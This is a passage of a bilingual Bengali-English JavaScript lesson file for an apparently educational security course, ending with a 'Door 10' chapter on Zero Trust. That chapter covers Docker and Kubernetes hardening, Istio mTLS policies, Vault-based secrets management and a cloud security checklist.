</div>
<div class="svg-caption">চিত্র: Defense in depth — WAF → Rate limit → Auth → Validation। একটি ভাঙলে অন্যটি রক্ষা।</div>

<div class="secret-box">🛡️ <strong>Defense in depth — প্রতিটি স্তরে প্রহরী।</strong> CORS, CSP, rate limit, WAF, HSTS। কোনো একটি ভাঙলে অন্যটি রক্ষা। কিন্তু সবচেয়ে শক্তিশালী দর্শন — কেউ বিশ্বাসযোগ্য নয়। সেই দর্শন — শেষ দরজায়।</div>`,
  senior: {
    title: "Security Defenses এক নজরে",
    body: `<table class="kv-table"><tr><th>Defense</th><th>কী করে</th></tr>
<tr><td class="hl">CORS</td><td>ডোমেইন whitelist — কে API ডাকে</td></tr>
<tr><td class="hl">CSP</td><td>Script whitelist — XSS প্রতিরোধ</td></tr>
<tr><td class="hl">Rate Limit</td><td>request/মিনিট সীমা</td></tr>
<tr><td class="hl">WAF</td><td>OWASP rules — automated</td></tr>
<tr><td class="hl">HSTS</td><td>HTTPS বাধ্যতামূলক</td></tr>
<tr><td class="hl">Defense in Depth</td><td>একাধিক স্তর — কেউ ভাঙলে অন্য রক্ষা</td></tr></table>`
  }
});

doors.push({
  num: 10,
  icon: "🏰",
  color: "#dc2626",
  name: "বিশ্বাসের দুর্গ",
  subtitle: "The Fortress of Zero Trust",
  tech: "Zero Trust Architecture — BeyondCorp (Google 2014), never trust always verify, mTLS, microsegmentation, synthesis",
  spirit: "হিকমাহ — প্রয়োগিক জ্ঞান, সব প্রতিরক্ষার সমন্বয়",
  secret: "Never trust, always verify। কেউ বিশ্বাসযোগ্য নয় — অভ্যন্তরীণ বা বাহ্যিক। প্রতিটি অনুরোধ যাচাই। mTLS, microsegmentation, least privilege। এটাই Zero Trust — Google BeyondCorp (২০১৪) থেকে।",
  recall: {
    q: " Zero Trust Architecture কী? BeyondCorp কী?",
    qen: "What is Zero Trust Architecture? What is BeyondCorp?",
    a: "Never trust, always verify। প্রতিটি অনুরোধ যাচাই — অভ্যন্তরীণ বা বাহ্যিক। BeyondCorp = Google-এর Zero Trust implementation (২০১৪)। VPN নয়, device + user যাচাই।",
    aen: "Never trust, always verify. Every request verified — internal or external. BeyondCorp = Google's Zero Trust implementation (2014). Not VPN — device + user verification."
  },
  story: `<p class="scene-setting">নয়টি দরজা পেরিয়েছো। কামরান এনক্রিপশন, জাইনাব চাবি আদান, হামজা হ্যাশ, সাফওয়ান পাসওয়ার্ড, ইমরান সার্টিফিকেট, বিলাল TLS, রুকাইয়া JWT, আনাস injection, ওমর defense। এখন সব মেলাও — একটি দুর্গ। একটি দুর্গ যেখানে কেউ বিশ্বাসযোগ্য নয়। প্রতিটি দরজায় যাচাই। এটাই Zero Trust।</p>
<p class="scene-setting en">Nine doors passed. Kamran encryption, Zainab key exchange, Hamza hashing, Safwan passwords, Imran certificates, Bilal TLS, Rukayya JWT, Anas injection, Umar defense. Now combine them all — a fortress. A fortress where no one is trusted. Every door verified. This is Zero Trust.</p>

<div class="callout info"><span class="co-icon">🏰</span><div><strong>সম্পূর্ণ ক্রিপ্টোগ্রাফি — নয় দরজার সমন্বয়:</strong><br>
<strong>Door ১ — কামরান (AES/RSA):</strong> ডেটা এনক্রিপ্ট<br>
<strong>Door ২ — জাইনাব (DH):</strong> চাবি আদান<br>
<strong>Door ৩ — হামজা (Hash):</strong> অখণ্ডতা যাচাই<br>
<strong>Door ৪ — সাফওয়ান (Password):</strong> ইউজার যাচাই<br>
<strong>Door ৫ — ইমরান (Certificate):</strong> সার্ভার যাচাই<br>
<strong>Door ৬ — বিলাল (TLS):</strong> সংযোগ সুরক্ষা<br>
<strong>Door ৭ — রুকাইয়া (JWT):</strong> অনুমতি প্রদান<br>
<strong>Door ৮ — আনাস (Injection):</strong> ইনপুট প্রতিরোধ<br>
<strong>Door ৯ — ওমর (Defense):</strong> একাধিক স্তর</div></div>

<div class="code-block"># ── STEP 1: What is Zero Trust? ──
# Traditional security: "castle and moat" — hard outside, soft inside.
# Once inside the network, everything is trusted. WRONG.

# Zero Trust: "NEVER trust, ALWAYS verify."
# Even INSIDE the network, every request is authenticated and authorized.

# THE 3 PRINCIPLES OF ZERO TRUST:
principles = {
    "Verify explicitly": "Every request is authenticated, authorized, and validated",
    "Least privilege": "Give minimum access needed, time-limited",
    "Assume breach": "Design as if the attacker is already inside",
}

print("ZERO TRUST PRINCIPLES:")
for principle, desc in principles.items():
    print(f"  {principle}: {desc}")

# TRADITIONAL vs ZERO TRUST:
traditional = """
TRADITIONAL (Castle and Moat):
  Internet → Firewall → [Trusted Network]
  Inside: everything trusts everything
  Problem: if attacker breaches firewall → full access

ZERO TRUST:
  Internet → Verify → Verify → Verify → Verify
  Inside: NOTHING trusts anything without verification
  Every request checked: WHO, WHAT, WHERE, WHEN
"""

print(traditional)</div>

<div class="code-block"># ── STEP 2: Docker security ──
# Containers must be secured. Default Docker is NOT secure.

# DOCKERFILE SECURITY BEST PRACTICES:
dockerfile = """
# Use minimal base image:
FROM python:3.12-slim

# Don't run as root:
RUN useradd -m appuser
USER appuser

# Copy only needed files:
COPY --chown=appuser:appuser requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=appuser:appuser . .

# Read-only filesystem:
# (set at runtime, not Dockerfile)

# Health check:
HEALTHCHECK --interval=30s CMD curl -f http://localhost:8000/health || exit 1
"""

print(dockerfile)

# DOCKER RUN SECURITY:
docker_run = """
# Run container with maximum security:
$ docker run \\
    --read-only \\                    # filesystem read-only
    --cap-drop ALL \\                  # drop all Linux capabilities
    --cap-add NET_BIND_SERVICE \\      # only add what's needed
    --user 1000:1000 \\                # non-root user
    --network none \\                  # no network (or restricted)
    --memory=512m \\                   # memory limit
    --cpus=1.0 \\                      # CPU limit
    --tmpfs /tmp \\                    # temp filesystem
    --security-opt no-new-privileges \\ # prevent privilege escalation
    myapp:latest
"""

print(docker_run)

# WHAT EACH FLAG DOES:
flags = {
    "--read-only": "Container filesystem is read-only (can't write)",
    "--cap-drop ALL": "Remove all Linux capabilities (raw sockets, etc)",
    "--user 1000:1000": "Run as non-root user",
    "--network none": "No network access (isolation)",
    "--memory=512m": "Limit RAM (prevent resource exhaustion)",
    "--cpus=1.0": "Limit CPU (prevent runaway processes)",
    "--security-opt no-new-privileges": "Prevent sudo/setuid escalation",
}

print("DOCKER SECURITY FLAGS:")
for flag, desc in flags.items():
    print(f"  {flag}: {desc}")</div>

<div class="code-block"># ── STEP 3: Kubernetes security ──
# K8s adds orchestration security layers.

# POD SECURITY (security context):
k8s_pod = """
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  securityContext:
    runAsNonRoot: true       # never run as root
    runAsUser: 1000          # specific user
    fsGroup: 2000            # file system group
    seccompProfile:
      type: RuntimeDefault   # restrict system calls
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
      requests:
        memory: "256Mi"
        cpu: "250m"
"""

print(k8s_pod)

# NETWORK POLICY (restrict pod-to-pod communication):
k8s_network = """
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-policy
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend     # only frontend can reach API
    ports:
    - protocol: TCP
      port: 8000
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: database     # API can only reach database
    ports:
    - protocol: TCP
      port: 5432
"""

print(k8s_network)

# WHAT THIS DOES:
# - API pod can only be reached by frontend pod
# - API pod can only reach database pod
# - No random pod can access the API
# - Microsegmentation: each service isolated</div>

<div class="code-block"># ── STEP 4: Service mesh and mTLS ──
# SERVICE MESH (Istio, Linkerd): handles security between services.

# MUTUAL TLS (mTLS):
# Regular TLS: client verifies server's identity
# Mutual TLS: BOTH verify each other

mtls = """
WITHOUT mTLS:
  Service A →→→ Service B
  No encryption between services (even inside cluster!)

WITH mTLS (Istio):
  Service A ←cert→ Service B
  Both present certificates
  All traffic encrypted
  Certificates auto-rotated (every 24 hours)
  Even if network is breached, traffic is encrypted
"""

print(mtls)

# ISTIO PEER AUTHENTICATION (enable mTLS):
istio_mtls = """
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT    # ALL traffic must use mTLS (no exceptions)
"""

print(istio_mtls)

# ISTIO AUTHORIZATION (who can call what):
istio_authz = """
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: frontend-to-api
  namespace: production
spec:
  selector:
    matchLabels:
      app: api
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/frontend"]
    to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/*"]
"""

print(istio_authz)

# BENEFITS OF SERVICE MESH:
benefits = [
    "Automatic mTLS (no code changes needed)",
    "Fine-grained access control (per-service, per-route)",
    "Traffic encryption between all services",
    "Certificate rotation (automatic, frequent)",
    "Observability (tracing, metrics, logging)",
    "Circuit breaking (fail gracefully)",
]

print("SERVICE MESH BENEFITS:")
for benefit in benefits:
    print(f"  {benefit}")</div>

<div class="code-block"># ── STEP 5: Secrets management ──
# Never store secrets in code, Docker images, or environment files.

# SECRET MANAGEMENT TOOLS:
secret_tools = {
    "Kubernetes Secrets": "Native K8s secret storage (base64 encoded)",
    "HashiCorp Vault": "Centralized secret management, dynamic secrets",
    "AWS Secrets Manager": "Cloud-native, auto-rotation",
    "AWS KMS": "Encryption key management",
    "Docker Secrets": "Swarm-mode secrets (mounted as files)",
    "Cloud KMS": "Google Cloud / Azure key management",
}

print("SECRET MANAGEMENT TOOLS:")
for tool, desc in secret_tools.items():
    print(f"  {tool}: {desc}")

# KUBERNETES SECRETS:
k8s_secrets = """
# Create secret:
$ kubectl create secret generic db-secret \\
    --from-literal=password=supersecret123

# Use in pod:
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    env:
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: password
"""

print(k8s_secrets)

# HASHICORP VAULT (more secure):
vault_example = """
# Store secret in Vault:
$ vault kv put secret/myapp/db password=supersecret123

# App fetches at runtime (never stored in code):
import hvac
client = hvac.Client(url='https://vault.internal:8200', token=token)
secret = client.secrets.kv.v2.read_secret_version(path='myapp/db')
db_password = secret['data']['data']['password']
# Secret NEVER in source code, Docker image, or git
"""

print(vault_example)

# SECRET MANAGEMENT RULES:
rules = [
    "NEVER commit secrets to git (.env in .gitignore)",
    "NEVER bake secrets into Docker images",
    "Use secret management tools (Vault, KMS, Secrets Manager)",
    "Rotate secrets regularly (automated)",
    "Least privilege: each service only gets secrets it needs",
    "Audit secret access (log who accessed what when)",
    "Encrypt secrets at rest (KMS encryption)",
]

print("SECRET MANAGEMENT RULES:")
for rule in rules:
    print(f"  ☐ {rule}")</div>

<div class="code-block"># ── STEP 6: Cloud security best practices ──
# Security in the cloud (AWS/GCP/Azure):

cloud_security = {
    "IAM (Identity & Access Management)": {
        "principle": "Every user/service has minimal permissions",
        "practice": "Use roles, not individual users. Rotate access keys.",
    },
    "VPC (Virtual Private Cloud)": {
        "principle": "Network isolation",
        "practice": "Private subnets for databases, public for load balancers",
    },
    "Security Groups": {
        "principle": "Firewall rules per resource",
        "practice": "Deny all by default, allow only needed ports",
    },
    "Encryption at Rest": {
        "principle": "Encrypt databases, S3, EBS",
        "practice": "Use KMS-managed keys, encrypt all storage",
    },
    "CloudTrail / Audit Logs": {
        "principle": "Log every API call",
        "practice": "Monitor for suspicious activity, alert on anomalies",
    },
    "WAF (Web Application Firewall)": {
        "principle": "Filter malicious traffic",
        "practice": "OWASP rules, rate limiting, bot protection",
    },
}

print("CLOUD SECURITY BEST PRACTICES:")
for area, info in cloud_security.items():
    print(f"\n  {area}:")
    print(f"    Principle: {info['principle']}")
    print(f"    Practice: {info['practice']}")

# THE ZERO TRUST CHECKLIST:
zero_trust_checklist = """
ZERO TRUST CHECKLIST:

IDENTITY:
  ✅ Multi-factor authentication (MFA) everywhere
  ✅ Single Sign-On (SSO) with SAML/OIDC
  ✅ Passwordless (WebAuthn) where possible
  ✅ Service accounts with minimal permissions

DEVICES:
  ✅ Device posture check (is it managed? patched?)
  ✅ Endpoint Detection and Response (EDR)
  ✅ Disk encryption (BitLocker, FileVault)
  ✅ Automatic screen lock

NETWORK:
  ✅ Microsegmentation (small zones, not flat network)
  ✅ mTLS between all services
  ✅ Network policies (restrict pod-to-pod)
  ✅ VPN / Zero Trust Network Access (ZTNA)

APPLICATIONS:
  ✅ OAuth 2.0 / OpenID Connect
  ✅ API rate limiting
  ✅ Input validation
  ✅ Regular penetration testing

DATA:
  ✅ Encryption at rest (KMS)
  ✅ Encryption in transit (TLS 1.3)
  ✅ Data classification (public, internal, confidential)
  ✅ Data Loss Prevention (DLP)

MONITORING:
  ✅ Centralized logging (ELK, Splunk)
  ✅ SIEM (Security Information & Event Management)
  ✅ Anomaly detection (ML-based)
  ✅ Incident response plan

"You can't hack what you can't reach."
Zero Trust = make every attacker work harder at every step.
"""

print(zero_trust_checklist)

# CONGRATULATIONS!
# You've completed the Cryptography book.
# You now understand the COMPLETE security landscape:
# Door 1: Encryption (AES, RSA)
# Door 2: Key Exchange (Diffie-Hellman, ECDH)
# Door 3: Hashing (SHA-256, HMAC)
# Door 4: Password Security (Argon2, bcrypt)
# Door 5: PKI & Certificates (CA, Let's Encrypt)
# Door 6: TLS (HTTPS, handshake)
# Door 7: JWT Authentication
# Door 8: Injection Prevention (SQL, XSS, CSRF)
# Door 9: Security Headers (CSP, CORS, HSTS)
# Door 10: Zero Trust (Docker, K8s, mTLS, Vault)

# Security is a JOURNEY, not a destination.
# Keep learning, keep updating, keep vigilant.
# "The only truly secure system is one that is powered off,
# cast in a block of concrete, and sealed in a lead-lined room
# with armed guards." — Gene Spafford
# But we can get CLOSE enough.</div>

<div class="stat-grid">
<div class="stat-card"><div class="sc-num">৯</div><div class="sc-label">শিক্ষক</div></div>
<div class="stat-card"><div class="sc-num">৫০+</div><div class="sc-label">বছরের গবেষণা</div></div>
<div class="stat-card"><div class="sc-num">∞</div><div class="sc-label">প্রয়োগ</div></div>
<div class="stat-card"><div class="sc-num">০</div><div class="sc-label">বিশ্বাস</div></div>
</div>

<div class="verse">اللَّهُ نُورُ السَّمَاوَاتِ وَالْأَرْضِ</div>
<div style="font-size:.85rem;color:var(--ink-dim);text-align:center;margin-bottom:1rem">"আল্লাহ আসমান ও পৃথিবীর আলো।" — কুরআন ২৪:৩৫</div>

<p class="scene-setting">নূর — আলো। ক্রিপ্টোগ্রাফি হলো সেই আলো যা অন্ধকারে নিরাপত্তা দেয়। বাইরে থেকে একটি HTTPS সংযোগ সহজ মনে হয় — কিন্তু ভেতরে নয়টি স্তর কাজ করছে। AES এনক্রিপ্ট, DH চাবি আদান, SHA যাচাই, bcrypt পাসওয়ার্ড, CA সার্টিফিকেট, TLS হ্যান্ডশেক, JWT অনুমতি, injection প্রতিরোধ, defense in depth। সব মিলে — একটি দুর্গ। কোথাও কোনো দুর্বলতা নেই। এটাই Zero Trust — সর্বোচ্চ সতর্কতা, সর্বনিম্ন বিশ্বাস।</p>
<p class="scene-setting en">Nur — light. Cryptography is the light that provides security in darkness. Outside, an HTTPS connection seems simple — but inside, nine layers work. AES encrypts, DH exchanges keys, SHA verifies, bcrypt passwords, CA certificates, TLS handshake, JWT authorization, injection prevention, defense in depth. Together — a fortress. No weakness anywhere. This is Zero Trust — maximum vigilance, minimum trust.</p>

<div class="callout tip"><span class="co-icon">🔗</span><div><strong>সম্পূর্ণ লাইব্রেরি সংযোগ:</strong> Book ৩৭ (Networks) Door ৯ (TLS) → handshake। Book ৪৮ (Discrete Math) Door ৯ (Number Theory) → RSA math। Book ৪০ (Software Engineering) Door ৮ (Security) → OWASP। Book ৪৩ (Cloud DevOps) → mTLS, network policy। এই বই সবার নিরাপত্তার ভিত্তি।</div></div>

<div class="checklist">
<li>🔐 <code>openssl enc -aes-256-cbc</code> দিয়ে ফাইল এনক্রিপ্ট করো</li>
<li>🔑 <code>openssl genrsa</code> দিয়ে RSA keypair বানাও</li>
<li>#️⃣ SHA-256 hash দুটি ফাইলের তুলনা করো</li>
<li>📜 <code>openssl s_client</code> দিয়ে একটি সাইটের সার্টিফিকেট দেখো</li>
<li>🎫 JWT decode করো base64-এ</li>
<li>⚔️ Django-তে parameterized query লেখো</li>
<li>🏰 Docker read-only container চালাও</li>
<li>📖 "Real-World Cryptography" — David Wong পড়ো</li>
</div>

<div class="svg-diagram">
<svg viewBox="0 0 580 250" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto">
  <text x="290" y="25" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="900">🏰 Zero Trust: Never Trust, Always Verify</text>
  <rect x="180" y="60" width="220" height="50" rx="25" fill="#450a0a" stroke="#f87171" stroke-width="2"/>
  <text x="290" y="82" text-anchor="middle" fill="#fca5a5" font-size="9" font-weight="700">OLD: Castle &amp; Moat</text>
  <text x="290" y="98" text-anchor="middle" fill="#fca5a5" font-size="10">Inside network = trusted ❌</text>
  <text x="200" y="140" fill="#94a3b8" font-size="8">↓ Evolution ↓</text>
  <rect x="120" y="155" width="340" height="70" rx="25" fill="#052e16" stroke="#22c55e" stroke-width="2.5"/>
  <text x="290" y="180" text-anchor="middle" fill="#4ade80" font-size="10" font-weight="700">ZERO TRUST</text>
  <text x="290" y="198" text-anchor="middle" fill="#86efac" font-size="10">Every request verified: Who? What? Where? When?</text>
  <text x="290" y="212" text-anchor="middle" fill="#86efac" font-size="10">mTLS · Identity per service · Micro-segmentation</text>
</svg>
</div>
<div class="svg-caption">চিত্র: Zero Trust — কেউ বিশ্বাসযোগ্য নয়। প্রতিটি অনুরোধ যাচাই।</div>

<div class="secret-box">🏰 <strong>ক্রিপ্টোগ্রাফি = নিরাপত্তার গণিত।</strong> নয়টি দরজা, নয়জন শিক্ষক, একটি দুর্গ। AES থেকে Zero Trust — ৫০ বছরের গবেষণা প্রতিটি HTTPS সংযোগে বেঁচে আছে। এখন তুমি জানো — শুধু কীভাবে নয়, কেন। কেন TLS দুই চাবি ব্যবহার করে। কেন হ্যাশ একমুখী। কেন salt দরকার। কেন সার্টিফিকেট মেয়াদ শেষ হয়। কেন প্রতিটি ইনপুট শত্রু। কেন কেউ বিশ্বাসযোগ্য নয়। এটাই হিকমাহ — নিরাপত্তার প্রয়োগিক জ্ঞান।</div>`,
  senior: {
    title: "সম্পূর্ণ ক্রিপ্টোগ্রাফি এক নজরে",
    body: `<table class="kv-table"><tr><th>স্তর</th><th>কী</th><th>দরজা</th></tr>
<tr><td class="hl">Encryption</td><td>AES + RSA</td><td>১</td></tr>
<tr><td class="hl">Key Exchange</td><td>Diffie-Hellman</td><td>২</td></tr>
<tr><td class="hl">Integrity</td><td>SHA-256 Hash</td><td>৩</td></tr>
<tr><td class="hl">Password</td><td>bcrypt / Argon2</td><td>৪</td></tr>
<tr><td class="hl">Identity</td><td>Certificate + CA</td><td>৫</td></tr>
<tr><td class="hl">Connection</td><td>TLS 1.3 Handshake</td><td>৬</td></tr>
<tr><td class="hl">Authorization</td><td>JWT / Session</td><td>৭</td></tr>
<tr><td class="hl">Input Defense</td><td>SQL/XSS/CSRF prevention</td><td>৮</td></tr>
<tr><td class="hl">Layered Defense</td><td>CORS, CSP, Rate Limit, WAF</td><td>৯</td></tr>
<tr><td class="hl">Zero Trust</td><td>সব মিলে — never trust</td><td>১০</td></tr></table>`
  }
});
